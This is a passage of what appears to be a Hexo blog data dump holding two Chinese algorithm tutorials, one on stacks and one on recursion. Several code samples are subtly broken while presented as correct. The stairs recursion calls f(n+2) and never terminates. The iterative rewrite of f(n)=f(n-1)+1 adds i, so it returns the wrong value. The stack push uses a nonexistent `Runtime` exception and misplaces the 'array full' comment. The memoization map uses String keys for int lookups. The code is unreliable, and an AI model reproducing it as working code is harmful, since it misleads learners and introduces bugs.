class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 基于数组实现的链式栈</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ArrayStack</span>&lt;<span class=\"title\">T</span>&gt; <span class=\"keyword\">implements</span> <span class=\"title\">stack</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Object [] DEFAULT_ARRAY = <span class=\"keyword\">new</span> Object[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> DEFAULT_CAP = <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Object[] data;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span>  cap;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayStack</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.cap = DEFAULT_CAP;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.size = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.data = DEFAULT_ARRAY;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayStack</span><span class=\"params\">(<span class=\"keyword\">int</span> cap)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cap &lt; <span class=\"number\">0</span>) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalArgumentException(<span class=\"string\">\"Illegal Capacity: \"</span>+ cap);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.cap = cap;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.data = <span class=\"keyword\">new</span> Object[cap];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">push</span><span class=\"params\">(T val)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (size&lt;cap)&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 数组满了</span></span><br><span class=\"line\">            data[size] = val;</span><br><span class=\"line\">            size++;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Runtime(<span class=\"string\">\"stack is full!\"</span>)</span><br><span class=\"line\">          <span class=\"comment\">// 可以动态扩容的stack</span></span><br><span class=\"line\">          <span class=\"comment\">// Object[] objects = new Object[cap*2];</span></span><br><span class=\"line\">          <span class=\"comment\">// System.arraycopy(data, 0, objects, 0, size);</span></span><br><span class=\"line\">          <span class=\"comment\">// data = objects;</span></span><br><span class=\"line\">          <span class=\"comment\">// data[size] = val;</span></span><br><span class=\"line\">          <span class=\"comment\">// size ++;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">pop</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (size == <span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        T result = (T) data[size-<span class=\"number\">1</span>];</span><br><span class=\"line\">        size--;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>了解了定义和基本操作，那它的操作时间、空间复杂度是多少呢？</p>\n<p>不管是链式栈还是顺序栈，我们存储数据需要一个大小为n的数组就够了。在入栈和出栈的过程中，只需要一两个临时变量存储空间，因此时间复杂度是O(1)。</p>\n<p>注意这里存储数据需要一个大小为n的数组，并不是说空间复杂度是O(n)，因为这n个空间是必须的，无法省掉。所以我们说空间复杂度的时候，是指除了原本的数据存储空间外，算法运行还需要额外的存储空间。</p>\n<p>时间复杂度分析：不管是入栈、出栈，都只涉及栈顶个别数据的操作，因此时间复杂度为O(1)。</p>\n<h4 id=\"支持动态扩容的顺序栈\"><a href=\"#支持动态扩容的顺序栈\" class=\"headerlink\" title=\"支持动态扩容的顺序栈\"></a>支持动态扩容的顺序栈</h4><p>刚才那个基于数组实现的顺序栈，是一个固定大小的栈，也就是说，在初始化后需要实现指定栈的大小，当栈满之后，就无法在王栈里添加数据了，尽管链式栈的大小不受限，但是要存储next指针，内存消耗相对较多。那我们如何实现一个可以支持动态扩容的栈呢？</p>\n<p>还记得，在数组那一节，要如何来实现一个支持动态扩容的数组吗？当数组空间不足时，我们重新申请一块更大的内存，将原来数组中的数据拷贝过去，这样就实现了一个支持动态扩容的数组。</p>\n<p>所以，如果实现一个支持动态扩容的栈，我们只需要底层依赖一个支持动态扩容的数组就可以了。当栈满了之后，我们就申请一个更大的数组，将原来的数据搬移到新的数组中。</p>\n<p>实际上，支持动态扩容的顺序栈，我们开发中并不经常用到。这块我们复习一下复杂度分析方法。现在我们来分析一下支持动态扩容的顺序栈的入栈、出栈时间复杂度。</p>\n<p>对于出栈操作来说，不会涉及到内存的重新申请和数据搬移，所以出栈的时间复杂度仍然是O(1)。但是对于入栈操作来说，情况就不一样了，当栈中有空闲空间时，入栈操作时间复杂度为O(1)，当栈中没有空间不够时，就需要重新申请内存和数据搬移，所以时间复杂度就变成了O(n)。</p>\n<p>也就是说，对于入栈操作来说，最好时间复杂度为O(1)，最坏情况时间复杂度为O(n)。那平均情况下的时间复杂度是多少呢？还记得时间复杂度分析方法中的摊还分析法吗？这个入栈操作的平均情况的时间按复杂度正好可以用摊还分析法来分析。</p>\n<p>为了分析方便，我们先做一些假设和定义：</p>\n<ul>\n<li>栈空间不够时，我们重新申请一个是原来大小两倍的数组；</li>\n<li>为了简化分析，假设只有入栈操作没有出栈操作；</li>\n<li>定义不涉及内存搬移操作的入栈操作为simple-push操作，时间复杂度为O(1)。</li>\n</ul>\n<p>如果当前栈大小为K，并且已满，当在有新的的数据要入栈时，就需要重新申请2倍大小的内存，并且做K个数据的搬移操作，然后在入栈。但是，接下来的K-1次入栈操作，我们都不需要在重新申请内存和搬移数据，所以这k-1次都只需要一次simple-push操作就可以完成。如下图：</p>\n\n<p>从上图看出，这K次入栈操作，总共涉及了K个数据的搬移，以及K次simple-push操作。讲K个数据搬移均摊到K次入栈操作，那每个入栈操作只需要一个数据搬移和一个simpel-push操作。以此类推，入栈操作的时间复杂度为O(1)。</p>\n<p>通过这个例子分析，也验证了前面讲的，均摊时间复杂度一般都等于最好时间复杂度。因为在大部分情况下，入栈操作的时间复杂度都是O(1)，只有在个别情况才会退化为O(n)，所以把耗时多的入栈操作的时间均摊到其他入栈操作上，平均情况下耗时就接近O(1)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"栈的应用场景\"><a href=\"#栈的应用场景\" class=\"headerlink\" title=\"栈的应用场景\"></a>栈的应用场景</h3></div><br></div>\n\n<h4 id=\"栈在函数调用中的应用\"><a href=\"#栈在函数调用中的应用\" class=\"headerlink\" title=\"栈在函数调用中的应用\"></a>栈在函数调用中的应用</h4><p>前面讲的都比较偏理论，我们现在来看，栈在软件工程中的实际应用。栈作为一个比较基础的数据结构，应用场景还是蛮多的。其中比较经典的一个应用场景就是函数调用栈。</p>\n<p>我们知道，操作系统给每个线程分配了一块独立的内存空间，这块内存空间被组织成“栈”这种结构，用来存储函数调用时的临时变量。每进入一个函数，就会将临时变量作为一个栈帧入栈，当被调用函数执行完成，返回之后，将这个函数对应的栈帧出栈。为了更好理解函数调用栈，一起来看一下这段代码的执行过程。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">  ret = add(<span class=\"number\">3</span>,<span class=\"number\">5</span>);</span><br><span class=\"line\">  res = a + ret;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>, res);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  sum = x + y;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从代码中我们可以看出，main函数调用了add函数，获取计算结果，并且与临时变量a相加，最后打印res的值，为了清晰的看到这个过程的函数栈里对应的入栈、出栈过程，我这里画了一张函数栈图：</p>\n<img src=\"/posts/2018-09-15-算法-栈/函数栈.jpg\">\n<h4 id=\"栈在表达式求值中的应用\"><a href=\"#栈在表达式求值中的应用\" class=\"headerlink\" title=\"栈在表达式求值中的应用\"></a>栈在表达式求值中的应用</h4><p>我们再来看一个栈的常见应用场景，编译器如何利用栈实现<strong>表达式求值</strong>。</p>\n<p>这里我们用一个只包含加减乘除四则运算的表达式来解释，比如：34+13*9+44-12/3。对于这个四则运算，我们人脑可以很快算出来，但是对于计算机来说，理解这个表达式本身就是个挺难的事。如果是你，你会怎么实现一个表达式求值的功能呢？</p>\n<p>实际上，编译器就是通过两个栈来实现的。其中一个是保存操作数的栈，另一个保存运算符的栈。我们从左往右遍历表达式，当遇到数字，我们直接压入操作数栈。当遇到运算符，就与运算符的栈顶元素进行比较。如果运算符比当前栈顶元素的优先级高，就直接压入运算符栈中，如果比栈顶元素的优先级低或者相同，就将当前栈顶元素取出，再从操作数栈中取出两个操作数，然后进行运算，再把计算完的结果压入操作数栈，继续比较。</p>\n<p>这里用一个简单的例子：3+5*8-6 我将这个表达式的计算过程画成一个图，结合图来理解刚才的计算过程。</p>\n<img src=\"/posts/2018-09-15-算法-栈/表达式栈图.jpg\">\n<h4 id=\"栈在括号匹配中的应用\"><a href=\"#栈在括号匹配中的应用\" class=\"headerlink\" title=\"栈在括号匹配中的应用\"></a>栈在括号匹配中的应用</h4><p>出了用栈来实现表达式求值，我们还可以借助栈来检查表达式中的括号是否匹配。</p>\n<p>我们同样简化一下背景，假设表达式只包含三种括号，圆括号()、方括号[]、花括号{}，并且他们可以任意嵌套。比如{[{}]}、[([]){()}]等都为合法格式，而{[}()或[{(}]为非法格式。那现在给你一个包含三种括号的表达式字符串，如何检查它是否合法呢？</p>\n<p>这里也可以用栈来解决。我们用栈来保存未匹配的左括号，从做到右一次扫描字符串。当扫描到左括号时，则将其压入栈中，当扫描到右括号时，从栈顶取出一个左括号。如果能够匹配，比如”(“和”)”匹配、”[“和”]”匹配、”{“和”}”匹配，则继续扫描剩下的字符串。如果扫描过程中，遇到不能匹配的右括号，或者栈中没有数据，则说明为非法格式。</p>\n<p>当所有的括号都扫描完成后，如果栈为空，则说明字符串为合法格式；否则说明有为匹配的左括号，为非法格式。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>好了，理解了栈的概念和应用，再回头看看开篇的问题。如何实现浏览器的前进、后退功能？学过栈之后，就可以用两个栈完美的解决这个问题了。</p>\n<p>我们使用两个栈X、Y，把首次浏览的页面压入栈X，当点击后退按钮时，依次从栈X中出栈，并将出栈的数据依次放入栈Y。当我们点击前进按钮时，依次取出栈Y中的数据，并放入栈X。当X中没有数据时，说明没有页面可以后退了。当Y中没有数据时，说明没有页面可以点击前进按钮进行浏览了。</p>\n<p>当我们依次浏览了a、b、c三个页面，我们依次把a、b、c压入栈，这个时候，两个栈的数据就是如下这个样子：</p>\n<img src=\"/posts/2018-09-15-算法-栈/浏览器栈1.jpg\">\n<p>当我们通过浏览器的后退按钮，从页面c后退到页面a之后，我们依次把c、b从栈X中弹出，并且依次放入栈Y中，这个时候栈中的数据就是如下：</p>\n<img src=\"/posts/2018-09-15-算法-栈/浏览器栈2.jpg\">\n<p>这时候，又想看页面b，于是点击前进按钮回到b页面，我们就把b再从栈Y中取出，放入X，此时栈中数据如下：</p>\n<img src=\"/posts/2018-09-15-算法-栈/浏览器栈3.jpg\">\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3></div><br></div>\n\n<p>栈是一种操作受限的数据结构，只支持入栈和出栈操作。后进先出是它的最大特点。栈既可以通过数组来实现，也可以通过链表来实现。不管是数组实现的栈，还是链表实现的栈，他们的入栈、出栈时间复杂度都为O(1)。在基于数组实现的动态扩容的顺序栈中，时间复杂度均为O(1)，重点是入栈时间复杂度中关于摊还分析法的掌握。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h3></div><br></div>\n\n<p>1、再讲栈的应用时，讲到用函数调用栈来保存临时变量，为什么函数调用要用”栈”这种数据结构来保存临时变量呢？用其他数据结构可以吗？<br>2、我们知道，JVM内存管理中有个“堆栈”的概念。栈内存用来白村局部变量和方法调用，堆内存用来存储java中的对象。那JVM里面的“栈”和我们这里的“栈”一样吗？不一样的话，为什么叫“栈”呢？</p>\n<p><br></p>\n"},{"title":"算法-递归","date":"2018-09-17T16:18:36.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n推荐注册返佣金这个功能我想你应该不陌生吧？现在很多app都有这个功能。这个功能中，用户A推荐用户B注册，用户B又推荐了用户C注册，我们可以说C的“最终推荐人”为用户A，用户B的“最终推荐人”也为用户A，用户A没有“最终推荐人”。\n\n一般来说，我们会通过数据库记录这种推荐关系，在数据库表中，我们可以记录两行数据，其中actor_id表示用户id，referrer_id表示推荐人id。\n\n|actor_id|referer_id|\n|:-------:----------|\n| B      |  A       |\n| C      |  B       |\n\n\n基于这个背景，我的问题是，<font color=\"red\">**给定一个用户ID，如何查找这个用户的“最终推荐人”？**</font> 带着这个问题，我们来学习今天的内容，递归（Recursion）！\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何理解递归\n{% endnote %}\n</div>\n\n从我自己学习数据结构和算法的经历来看，我个人觉得，有两个最难理解的知识点，一个是**动态规划**，另一个就是**递归**。\n\n递归是一种应用非常广泛的算法，之后很多的数据结构和算法的编码实现都要用到递归，比如DFS深度优先搜索，前中后序二叉树遍历等等，所以，搞懂递归非常重要，否则，后面复杂一点的数据结构和算法学起来就会比较吃力。\n\n不过，别看我说了这么多，递归本身可一点不“高冷”，我们生活中就有很多用到递归的例子。\n\n比如周末你带着女朋友去电影院看电影，女朋友问你，我们坐在第几排？电影院太黑了，没法数，现在你怎么办？\n\n这时候递归就派上用场了，于是你问前面一排的人他是第几排，你想只要在他的数字上加一，就知道自己在那一排了。但是，前面的人也不清楚，所以他也问他前面的人，就这样一排一排往前问，直到问道第一排的人，说我在第一排，然后在这样一排一排再把数字传回来，直到你前面的人告诉你他在那一排，于是你就知道答案了。\n\n这就是一个标准的用递归求解问题的分解过程，去的过程叫“递”，回来的过程叫“归”。基本上，所有的递归问题都可以用递推公式来表示，刚刚这个生活中的例子，我们用递推公式来表示就是下面这样的\n\n$$ f(n) = f(n-1) +1 ;\\\\ 其中f(1)=1 $$\n\nf(n)表示你想知道自己在那一排，f(n-1) 表示前面一个人所在的排数，f(1)=1表示第一排的人知道自己在第一排。有了这个递推公式，我们就可以很轻松的将它改为递归代码：\n```C\nint f(int n){\n\tif(n==1) return 1;\n\treturn f(n-1)+1;\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 什么时候可以用递归呢\n{% endnote %}\n</div>\n\n刚刚这个例子是典型的递归，那究竟什么问题可以用递归来解决呢？我这总结了三个条件，只要同时满足以下三个条件，就可以用递归来解决 。\n\n**1、一个问题的解可以分解为几个子问题的解**\n\n何为子问题？子问题就是数据规模更小的问题。比如，前面的电影院的例子，你要知道自己在哪排，可以分解为\"前一排的人在那一排？\"这样一个子问题。\n\n**2、这个问题与分解之后的子问题，除了数据规模不同，求解思路完全一样**\n\n还是以电影院的例子说明，你求解“自己在那一排”，和前面的人求解“自己在那一排”的思路，是完全一样的。\n\n**3、存在递归终止条件**\n\n把问题分解为子问题，再把子问题分解为子子问题，一层一层分解，不能存在无限循环，这就需要存在终止条件。在电影院的例子中，第一排的人不需要再继续询问任何人，就知道自己在那一排，也就是f(1)=1，这就是递归的终止条件。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何写递归代码\n{% endnote %}\n</div>\n\n说了这么多，那如何写递归代码呢？个人觉得，写递归代码最关键的是<font face=\"微软雅黑\" color=\"red\">**写出递推公式，找到终止条件**</font>，剩下将递推公式转化为代码就很容易了。\n\n我这里举个例子，来一步一步实现递归代码。\n\n> 如果有n个台阶，每次你可以跨 1 个台阶或者 2 个台阶，请问走完这n个台阶有多少种走法？\n\n如果有7个台阶，你可以走2、2、2、1这样上去，也可以走1、2、1、1、2这个样子上去，总之有很多中走法，那如何用编程来求总共有多少种走法呢？\n\n我们仔细想一下，实际上，可以根据第一步的走法把所有走法分为两类，第一类是第一步走了1个台阶，另一类是第一步走了2个台阶，所以，n个台阶的走法就等于先走一个台阶后，n个台阶的走法加上先走2个台阶后，n-2个台阶的走法，用公式表示就是：\n$$f(n) = f(n-1) + f(n-2) $$\n\n有了递推公式，递归代码基本就完成了一半。我们再来看下终止条件。当有一个台阶时，我们不需要再继续递归，就只有一种走法，所以f(1)=1。那么这个终止条件够吗？我们可以用n=2，n=3这些较小的数实验一下。\n\nn=2时，f(2)=f(1)+f(0),已知的终止条件为f(1)=1,所以f(2)就无法求解了，所以除了f(1)=1这个终止条件之外，我们还需要f(0)=1，表示0个台阶有一种走法，不过这样就不符合正常逻辑了。所以我们可以把f(2)作为一个终止条件，表示走2个台阶，有两种走法（一步走完或者分两步走）。\n\n所以最终的终止条件就是f(1)=1,f(2)=2。这个时候，可以拿n=3，n=4来验证一下，这个终止条件是否足够或者正确。\n\n我们把刚刚的递推公式和终止条件放到一起就是最终的递推公式：\n$$ f(n) = f(n-1) + f(n-2); \\\\ 其中 \\\\ f(1)=1, f(2)=2; $$\n\n有了上面的递推公式，转化成代码就简单多了，最终的递归代码如下：\n```C\nint f(int n) {\n\tif(n==1) return 1;\n\tif(n==2) return 2;\n\treturn f(n-1)+f(n+2);\n}\n```\n\n总结一下，<font color=\"red\">**写递归代码的关键就是要找到如何将大问题分解为小问题的规律，并且基于此写出递推公式，然后在推敲递推终止条件，最后再将递推公式转化为递归代码。**</font>\n\n讲了这么多方法，是不是你现在还是有种想不太清楚的地方呢？实际上，这也是文章开头我说递归代码比较难理解的地方。\n\n上面举的电影院的例子，我们的递归调用只有一个分支，也就是说“一个问题只需要分解为一个子问题”，我们可以很容易的想清楚“递”和“归”的每一个步骤，说以写起来、理解起来都不难。\n\n但是，当我们面对的是一个问题分解为多个子问题的情况时，递归代码就没那么好理解了。\n\n像刚刚讲的第二个爬台阶的例子，人脑几乎没办法把整个\"递\"和\"归\"的过程一步一步都想清楚。\n\n计算机擅长做重复的事，所以递归正和它的胃口。而我们人脑更喜欢平铺直述的思维方式，当我们看到递归时，我们总想把递归平铺展开，脑子里就会循环，一层一层往下调，然后在一层一层返回，试图搞清楚计算机每一步是怎样执行的，这样就会很容易绕进去。\n\n对于递归代码，这种试图想清楚整个递和归过程的做法，实际上是进入了一个思维误区。很多时候，我们理解起来比较吃力，主要原因就是自己给自己制造了这种理解障碍。那正确的思维方式应该是怎样的呢？\n\n如果一个问题A可以分解为若干子问题B、C、D，你可以假设子问题B、C、D已经解决，在此基础上思考和解决问题A，而且，你只需要思考问题A和子问题B、C、D两层之间的关系即可，不需要一层一层往下思考子问题与子子问题，子子问题与子子子问题之间的关系。屏蔽掉递归细节，这样子理解起来就简单多了。\n\n因此，编写递归代码的关键是，**只要遇到递归，我么就把它抽象成一个递推公式，不用想一层层的调用关系，不要试图用人脑去分解递归的每个步骤**\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 递归代码警惕堆栈溢出\n{% endnote %}\n</div>\n\n在实际的软件开发中，编写递归代码时，我们会遇到很多问题，比如堆栈溢出，而堆栈溢出会造成系统性崩溃，后果会非常严重。为什么递归代码容易造成堆栈溢出呢？我们又如何预防堆栈溢出呢？\n\n在\"栈\"那一节讲过，函数调用会使用栈来保存临时变量。每调用一个函数，都会将临时变量封装为栈帧压入内存栈，等函数执行完返回时，才出栈。系统栈或虚拟机栈一般都不会很大，如果递归求解的数据规模很大，调用层次很深，一直压入栈，就会有堆栈溢出的风险。\n\n比如上面求解的电影院的例子，如果我们将系统栈或者虚拟机栈的大小设置为1KB，在求解f(19999)时就会出现如下堆栈错误：\n```java\nException in thread \"main\" java.lang.StackOverflowError\n```\n\n那么如何避免堆栈溢出呢？\n\n我们可以通过在代码中限制递归调用的最大深度的方式来解决这个问题。递归调用超过一定深度（比如1000）之后，我么就不在继续往下递归了，直接返回报错。还是电影院那个例子，我们可以改造成下面这个样子，就可以避免堆栈溢出了。不过，我这写的是些伪代码，为了代码的简洁，有些边界条件没有考虑，比如n<=0。\n\n```C\n// 表示递归的深度\nint depth = 0;\nint f(int n){\n\t++depth;\n\tif(depth>1000)throw exception;\n\n\tif(n==1) return 1;\n\treturn f(n-1)+1;\n}\n```\n但这种做法并不能完全解决问题，因为最大允许的递归深度跟当前线程剩余的栈空间大小有关，事先无法计算。如果实时计算，代码过于复杂，就会影响了代码的可读性。所以，如果最大深度比较小，比如10、50，就可以用这种方法，否则这种方法并不是很实用。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 递归代码警惕重复计算\n{% endnote %}\n</div>\n\n除此之外，使用递归时还会出现重复计算的问题，将刚才讲的第二个递归代码的例子，如果我们把整个递归过程分解一下的话，那就是这样的：\n{% asset_img 台阶递归图.jpg %}\n\n从图中，我们可以直观的看到，想要计算f(5)，需要先计算f(4)、f(3)，而计算f(4)还需要计算f(3)，因此f(3)就被计算了很多次，这就是重复计算问题。\n\n为了避免重复计算问题，我们可以用一个数据结构（比如散列表）来保存已经求解过的f(n)。当递归调用到f(n)时，先看下是否已经求解过了。如果是则直接从散列表中取值返回，不需要重复计算，这样就能避免刚才讲的重复计算了。\n\n按照上面的思路，我们再来改造一下代码：\n```java\nMap<String, Integer> map = new Hashmap<>();\npublic static int f(int n){\n\tif(n==1) return 1;\n\tif(n==2) return 2;\n\tif(map.containsKey(n)){\n\t\treturn map.get(n);\n\t}\n\tint ret = f(n-1) + f(n-2);\n\tmap.put(n, ret);\n\treturn ret;\n}\n```\n\n除了堆栈溢出、重复计算这两个常见的问题，递归代码还有其他很多别的问题。\n\n在时间效率上，递归代码里多了很多函数调用，当这些函数调用的数量较大时，就会积累成一个可观的时间成本。在空间复杂度上，因为递归调用一次就会在内存栈上保存一次现场数据，所以进行递归代码的空间复杂度分析时，需要考虑这部分的开销。比如电影院的的例子中，空间复杂度并不是O(1)，而是O(n)。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 怎样将递归代码改写为非递归代码\n{% endnote %}\n</div>\n\n我们刚讲了，递归有利有弊，利是递归代码的表达力很强，写起来非常简洁；而弊是空间复杂度高，有堆栈溢出的风险，存在重复计算的问题，过多的函数调用会导致耗时较多等问题。所以在实际开发中，我们需要根据实际情况来选择是否需要用递归的方式来实现。\n\n那我们是否可以将递归代码改写为非递归代码呢？\n\n仍以刚才的电影院的例子，我们抛开场景，只看f(n) = f(n-1)+1 这个递推公式。我们可以这样改改看看：\n```C\nint f(int n){\n\tint ret = 1;\n\tfor(int i=2; i<=n; ++i){\n\t\tret = ret+i;\n\t}\n\treturn ret;\n}\n```\n\n同样，第二个例子也可以改写为非递归的方式实现。\n\n```C\nint f(int n){\n\tif(n==1)return 1;\n\tif(n==2)return 2;\n\n\tint ret = 0;\n\tint prepre = 1; // f(1)=1\n\tint pre = 2;    // f(2)=2\n\tfor(int i=3;i<=n;++i){ //f(3) = f(2)+f(1)\n\t\tret = pre + prepre;\n\t\tprepre = pre;\n\t\tpre = ret;\n\t}\n\treturn ret;\n}\n```\n\n那是不是所有的递归代码都可以改写为这种**迭代循环**的非递归写法呢？\n\n笼统的讲，是的。因为递归本身就是借助栈来实现的，只不过我们使用的栈是系统或者虚拟机本身提供的，我们没有感知罢了。如果我们自己在内存堆上实现栈，手动模拟入栈、出栈过程，这样任何递归代码都可以改写成看上去不是递归代码的样子。\n\n但是这种思路实现上是将递归改为了“手动”递归，本质并没有变，而且也没有解决前面讲到的基础问题，徒增了实现的复杂度。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n到此为止，递归相关的知识也讲完了，我们来看一下开篇的问题：如何找到“最终推荐人”？我们的解决方案是这样的：\n\n```java\nlong findRootRefererId(long actorId){\n\tlong refererId = select referer_id from [table] where actor_id = actorId;\n\tif(refererId == null) return actorId;\n\treturn findRootRefererId(refererId)\n}\n```\n\n是不是非常简洁，用三行代码就搞定了，不过在实际项目中，上面的代码并不能工作，为什么呢？这里有两个问题。\n\n第一，如果递归很深，可能会有堆栈溢出问题。\n\n第二，如果数据库存在脏数据，我们还需要处理由此产生的无限循环递归的问题。比如demo环境下数据库中，测试工程师为了方便测试，会认为的插入一些数据，就会出现脏数据，如果A的推荐人是B，B的推荐人是C，C的推荐人是A，这样就会发生死循环。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n递归是一种非常高效、简洁的编码技巧，只要满足“三个条件”的问题都可以通过递归代码来解决。\n\n不过递归代码也比较难写、难理解。编写递归代码的关键就是不要把自己绕进去，正确姿势是写出递推公式，找到终止条件，然后再翻译成递归代码。\n\n递归代码虽然简洁高效，但是递归代码也有很多弊端。比如，堆栈溢出、重复计算、函数调用耗时多、空间复杂度高等，所以，在编写递归代码时，一定要控制好这些副作用。\n\n\n### 思考题\n\n1、 递归代码的时间复杂度该如何分析？\n\n2、 递归代码如何调试呢？你有什么好的调试方法吗？\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-递归.md","raw":"---\ntitle: 算法-递归\ndate: 2018-09-18 00:18:36\ntags: ['算法','递归']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n推荐注册返佣金这个功能我想你应该不陌生吧？现在很多app都有这个功能。这个功能中，用户A推荐用户B注册，用户B又推荐了用户C注册，我们可以说C的“最终推荐人”为用户A，用户B的“最终推荐人”也为用户A，用户A没有“最终推荐人”。\n\n一般来说，我们会通过数据库记录这种推荐关系，在数据库表中，我们可以记录两行数据，其中actor_id表示用户id，referrer_id表示推荐人id。\n\n|actor_id|referer_id|\n|:-------:----------|\n| B      |  A       |\n| C      |  B       |\n\n\n基于这个背景，我的问题是，<font color=\"red\">**给定一个用户ID，如何查找这个用户的“最终推荐人”？**</font> 带着这个问题，我们来学习今天的内容，递归（Recursion）！\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何理解递归\n{% endnote 